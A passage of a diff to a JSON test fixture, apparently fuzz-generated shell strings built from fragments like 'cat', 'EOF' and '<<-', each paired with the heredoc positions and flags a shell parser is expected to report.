+  "cmd": "(($'\t$[}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'a=\n@($((&$'\\'EOF())",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "`\\x\"]1(<<<])$'",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E$'<<-)&\t$-;]\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$((x",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "}\ncat $(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "a=-((((=(())'@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\") xE&<<<\n\t$(\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(($(<<E)@((\nEOF\n=(@(&\n\tEOF\n<<<-\"]=(<<-",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 7,
+    "lineEnd": 38,
+    "tag": "E",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 38,
+    "bodyEnd": 38,
+    "end": 38,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "<<-#)]E}EOF<<< ",
+  "heredocs": [
+   {
+    "start": 0,
+    "tailStart": 4,
+    "lineEnd": 15,
+    "tag": "#",
+    "quoted": false,
+    "dash": true,
+    "bodyStart": 15,
+    "bodyEnd": 15,
+    "end": 15,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "\n\tEOF\n@(#EOF$((($'<<<; =(\n(@(]-`$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "]1\\\n$(()`((`$(<<-<<-&-`\"\nEOF\n@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\n\\\n<<<((<<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(<<<<<-\\<<<\\\n\n\tEOF\n",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 9,
+    "lineEnd": 13,
+    "tag": "<",
+    "quoted": true,
+    "dash": true,
+    "bodyStart": 14,
+    "bodyEnd": 19,
+    "end": 19,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "X$('$;$((]&\nEOF\nx1\t$' ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<$['E)\n}-<<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$(($((\\E]]",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "#$($(\nEOF\n$((}\\&[=(\n$(EOF))${\nx-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": " -\n\tEOF\na=\"",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "@(((cat \nEOF\ncat \\\"&\\$'",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&<<$($'&1=(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "((\\a=x<<$'x\\\n;\n\tEOF\n'$(((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1<<<\"$-$(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n$'@(\"$[\"\n'cat ",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "'=(\n${$`-a=((\n\"#a=\n\tEOF\n\n\tEOF\n\\\n ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "#${$`(($((cat EOF\n|&1",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "\n\tEOF\n${<<)\nEOF\n<<;-)E$($[;#cat &;",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "@(<<<<#<<<\t( ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "@(${1",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "''$'<<(\t\t<<\n|EOF#((``(($[${",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": " E[",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "E$[cat  <<<EOF-';| \"cat ]X\n\tEOF\n|\n\tEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "((<<-#1; 1'@());))E-<<\nEOF\n<<((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(&\t${\\\n$",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1@(`\n\tEOF\n$'\n((Xa=",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n$('",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E\n`}&${ ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1<<] EOF$'",
+  "heredocs": [
+   {
+    "start": 1,
+    "tailStart": 4,
+    "lineEnd": 10,
+    "tag": "]",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 10,
+    "bodyEnd": 10,
+    "end": 10,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "$'a= ));))}@(<<<EOF$[1|\t@(\"${",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "((a=1cat }@((-\t\t$[$((\t",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=(\n\tEOF\n'$()cat \nEOF\nx\\\n=(#$\\\"",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n`<<-\\)",
+  "heredocs": [
+   {
+    "start": 2,
+    "tailStart": 7,
+    "lineEnd": 7,
+    "tag": ")",
+    "quoted": true,
+    "dash": true,
+    "bodyStart": 7,
+    "bodyEnd": 7,
+    "end": 7,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "|@(&x((cat $[@(X\n\tEOF\n]x\nEOF\n[$'|;<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$[\\$[cat a=",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"(($'xEOF\\}#=(a=\\)EOF`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "X$[1(($(-<<-\t'\\\nEOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$'# $[#$${\"(`\\\n<<]$\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$'$[}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF\t}EOF$'\"(${<<-\n\tEOF\n-\\;<<<=($[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=(\nEOF\n&Ecat ]-=(| ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "`$'\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "a=|x|&(<<\\\\\n@(||&\\\n=(;",
+  "heredocs": [
+   {
+    "start": 7,
+    "tailStart": 11,
+    "lineEnd": 11,
+    "tag": "\\",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 12,
+    "bodyEnd": 22,
+    "end": 22,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "\nEOF\n$'E)\"\nEOF\ncat ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "xx#<<<&(\n\nEOF\n((E1(\n))$'",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n\tEOF\nEx[((<<-|$(1;\"[$'$((cat ))-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n$])",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&<<-x$=((((<<]$(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&$(($'a=$#)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat ;cat E@(X\\|@(<<<<<<]};$(${",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"\nEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "${EOF$((|\n((\n=(X<<)1\n\tEOF\n1",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "[$(($[-$'a=cat ))<<-\nEOF\n;$@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\nX`E}\n\tEOF\n-\"))E}(((\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$((<<([1",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\nEOF\ncat cat cat \\`<<-&]\\\n-=())",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<||a=\n<<$'X<<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat X[$(($[EOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<$'$EOFcat @(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&))\n${=(a=cat X$($E)1&\n\tEOF\n<<<;",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF(1$<<-((1#))(('cat )))]",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "a=))|'$EOF))$(}<<<||",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E)]${`$$'\n\tEOF\n\"$(}E ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n\tEOF\n\nEOF\n((\\\"1))$((\"[=(1`)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$''$``x$($",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "`${$'$(\"$(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\\",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "$[1X`\n\tEOF\n${\t$[\t\n\tEOF\n<<-\\\nE))`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")\n\tEOF\n`'$'(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'\nEOF\n$'1$'(&(\n$((#'",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "))}@($)a='\nEOF\n\n<<-|$(($cat ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n1@(}$=($$(($})cat =(}<<-\t",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<))${a=-<<<${<<& ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'))$))$((\nEOF\n\t\\\n$[`'(]",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF \n\nEOF\n`))x$((  \\\n\t($[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$(())$((\t<<<))cat 1<<-$((EOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"a=((a=; X`<<`$(X-\n\tEOF\n=(;\\",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=(\\\n&\n<<<\t (]",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF;EOF=((( <<1\nXE)\\\n\n$[)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&))\\\na=-\nEOF\n[<<1-E[}\\<<<1&",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$[\nx`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")\n\tEOF\n`$'-$((\n\tEOF\n#E`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "( ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$( cat ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ";X@(${EOF\"\\\\\n<<]$(\nEOF\n[\")\tEOF\nEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\tx#}}X((\nX[X(x",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "]<<x;@(&\nEOF\n[EOFx$'`\n\tEOF\nE'",
+  "heredocs": [
+   {
+    "start": 1,
+    "tailStart": 4,
+    "lineEnd": 8,
+    "tag": "x",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 9,
+    "bodyEnd": 29,
+    "end": 29,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "EOF]|",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "- =(\\\n<<-EEOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOFEOF[EOFE'x$((${",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<E\t<<\nEOF\n&(}`\\;]$[))}#",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=($'-<<<|-\"@(x)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E\t\n$'));$(\\\n`))=(=($xcat $[$(E",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": " $\"\"($(\t<<-$[<<${)\\<<<<<x",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "}$((\nEOF\n|#=(\n\tEOF\n<<<$'\n\tEOF\n\\`@(-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\t--$'<<-))EOF\"",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "x$[\n((EOF1-\n;[cat $[};$((X\nEOF\n\"",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<-\"\\\nEOF\n}=(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "`\\\n$x\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<EOF(\\\n$<<-",
+  "heredocs": [
+   {
+    "start": 0,
+    "tailStart": 5,
+    "lineEnd": 12,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 12,
+    "bodyEnd": 12,
+    "end": 12,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "1[x]$(('$[X;",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "@(cat \t`-\\)))((\\\n]#",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$'$((a=$[cat ${`'<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$(`@( @(\\\n|'`<<-[-))a==(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "@(|<<-`[] `$(}x$'@())]x",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1$')) &@($<<-\n\tEOF\n1${=(1cat a=<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "x\nEOF\n$(]}<<-<<]<<(|1${x=(",
+  "heredocs": [
+   {
+    "start": 13,
+    "tailStart": 16,
+    "lineEnd": 26,
+    "tag": "]",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 26,
+    "bodyEnd": 26,
+    "end": 26,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "\n((-|#$($(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF)]=(|\\\nEOF\nEOF\n\"#$((\n\tEOF\n cat <<]",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E$[&\\(($'X$((\\))EOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "a=))\"EOF\n\tEOF\n@($'\nEOF\n\n<<-;][",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")\n|cat }|&xE <<${X))",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&}$[=()[))-\\@(}`;$(]$[}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\nEOF\n|\n<<<=(EOF$((`<<}$(\nEOF\n;",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "' ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "''\\<<EOF$'\n(\nEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$-;'=(\n\tEOF\n-'",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "))`<<-@(",
+  "heredocs": [
+   {
+    "start": 3,
+    "tailStart": 7,
+    "lineEnd": 8,
+    "tag": "@",
+    "quoted": false,
+    "dash": true,
+    "bodyStart": 8,
+    "bodyEnd": 8,
+    "end": 8,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "\na=)<<EOF(\nEOF\n",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 9,
+    "lineEnd": 10,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 11,
+    "bodyEnd": 11,
+    "end": 14,
+    "closed": true
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "[",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "$[ E<<-]${`\n \\\n\n<<-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=(cat )$(\nEOF\n$[\\(cat EOFx",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E\nEOF\n@(Ea=((|X#\\\n$'",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "a=cat '@(<<<\nEOF\nx&\nEOF\n]`\tX${}<<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E1|<<<\"E]))x",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF}@(\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"\t`((<<-$",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "}(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "`-}\\ <<<EOF']`EOFa=a=\n\tEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$((`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "[`\n${@(\nEOF\n((Xx$((1",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1}))$[))(($'X<<<E$(<<<#$[}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "[$<<-\t\n xXx",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "a=1;a=",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "=(\t",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\t;[;$(1cat ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "]cat \t}#",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "\"&)\"$X(( \n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=()[x=(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'a=\nEOF\n}E\t\nEOF\nX)'$(@(}$((EOF'<<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$xX'<<<11]$<<\n\tEOF\n|]",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "-(('(=((((\n\tEOF\n]((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ";\n\tEOF\n-|'<<a=(\\`x<<<))$(<<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\nEOF\n|\\`=(E${\\\n\"'=(EOF-\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF\n\\",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "@($'-\n)cat ]cat ((${\nEOF\n$(($')$[&&",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\n<<a=\n",
+  "heredocs": [
+   {
+    "start": 2,
+    "tailStart": 6,
+    "lineEnd": 6,
+    "tag": "a=",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 7,
+    "bodyEnd": 7,
+    "end": 7,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "1[$(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "((`-}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "X$(\t|EOF\nEOF\n]EOF@(}\"\t$'$$",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<x#=(",
+  "heredocs": [
+   {
+    "start": 0,
+    "tailStart": 5,
+    "lineEnd": 6,
+    "tag": "x#=",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 6,
+    "bodyEnd": 6,
+    "end": 6,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "E;cat ;-$[cat \n\tEOF\n\\\n\\\n$X$'x }EOF(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "))}  [\\E;)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n\tEOF\n]=(${EOF[=()`<<\n\tEOF\n\\\ncat ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'-\"((@(a=<<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$(1(1$[\n\tEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "x[#=(\n\tEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "x\\\n${\"\nEOF\n((\nEOF\n#(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<[${\n\tEOF\n${[&|`(()@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "[${<<<=(cat ((\t=((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<\n}\\\n$[${-X=(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&1]$'$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n<<-\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "[<<<\\=(E=($((\\\n${<<-x))#[#",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&]",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "$((]$",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(cat - cat EOFcat ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n\tEOF\n&x}}\tEOF$[$'X",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(\\\\$[cat  []$((( ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$'['$($((\\]\"#-$(<<-#<<<",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 20,
+    "lineEnd": 23,
+    "tag": "#",
+    "quoted": false,
+    "dash": true,
+    "bodyStart": 23,
+    "bodyEnd": 23,
+    "end": 23,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "${`&|$$$((x\\\n@(`\nE'&#",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\n$((=(\\",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat ($\n}EOF`(\n=(\\",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=($'@(\"([",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\t\"`|;\\`<<<X=(-\n\tEOF\nEOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "))$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'cat $[[1$('$(${\n@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<-<<-\"-<<-$((|&\"",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "x\nEOF\n;${-|X",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "@(\\X$-}\\\n$'(}|<<<}X",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")<<-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "[cat (($()@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "X=(<<<((&`x",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF \nEOF\n\n\tEOF\n&=( @(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"-a=-$'\n\tEOF\n\"($(}EOF}X|\\",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "[$'X(X$'`\n\tEOF\n;=(@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n\n'<<$((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")); |;$a=\"<<<a=$(-a='<<<)'",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(<<;\n\tEOF\n((`(;<<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat $'\n\tEOF\nx\"$((#}$'<<-EOF$(E$[`$[`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1\n\tEOF\n\t@()@(\\\t))",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "X",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "$[& EOF}\n&",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "))&$($((cat (X[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$[<<-x)|a=@(x|\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "x$'$[ \\\n))$[\nEOF\n\\\nX",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "}<<<;$[[11$[1'x#",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'#$[)}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$('$(([$'#$(\\\ncat $'",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat 1EOF((|\")) [)<<(cat @([-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1cat \t']",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "}$))'EOF;<<<\\E#<<X \tx|$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&((cat )",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ";';\"${\ta=]",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "Ecat $[$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n)<<-\\\n]1`\\\n()<<-\n\tEOF\n(())\\",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1 \"<<<$(((\nEOF\n#)-<<-cat ;-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "|<<<<<<' ${#$[=($'",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "\nEOF\n",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "\\$((=(a=\\\n(\nEOF\n\nEOF\n]-)1<<-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "] )<<-<<-${((<<-`(E\t",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\$[\n)$'$(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "EOF1$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n\tEOF\n$'=(\n\tEOF\n#(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$[${$(| \\}(('xa=",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"1(1$((X<<}\\&|&@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": " $(<<-$]${\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&$[a=<<-EOF($'$(($\\\n\\\n\tEOF\n $((&=(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\n\t$(<<-<<;a=\nEOF\n\nEOF\n\nEOF\n[(X",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "};<<<${)\\]<<<))\n\tEOF\n[\\",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "@(\t$(())((<<\\\n<<`${$[${#",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "X1a=\\\n",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": " X \t\nEOF\n$']a=<<<]EOFE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "))-\"cat <<((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\nEOF\n &$((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")|\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat &))\\$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E<<))]\\#\t))a=\t",
+  "heredocs": [],
+  "certain": false
+ },
+ {
